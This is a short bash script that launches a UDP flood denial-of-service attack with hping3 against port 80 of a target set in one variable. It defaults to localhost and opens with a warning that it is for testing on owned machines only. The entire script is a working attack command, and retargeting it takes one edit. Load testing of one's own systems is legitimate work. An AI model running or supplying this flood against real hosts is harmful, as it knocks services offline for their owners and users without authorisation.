#!/bin/bash

# ==============================================================================
# !! WARNING: FOR TESTING PURPOSES ONLY !!
#
# By default, this script targets localhost (127.0.0.1) for safe testing.
# Do NOT change this to a public IP address unless you have explicit permission
# and ownership of both the source and target machines.
# ==============================================================================

TARGET="127.0.0.1"

echo "[*] Starting UDP flood attack on $TARGET..."
echo "[*] This requires hping3. Run 'sudo apt install hping3' if not found."
# --flood: send packets as fast as possible
# --udp: use UDP protocol
# -p 80: target port 80
sudo hping3 --flood --udp -p 80 $TARGET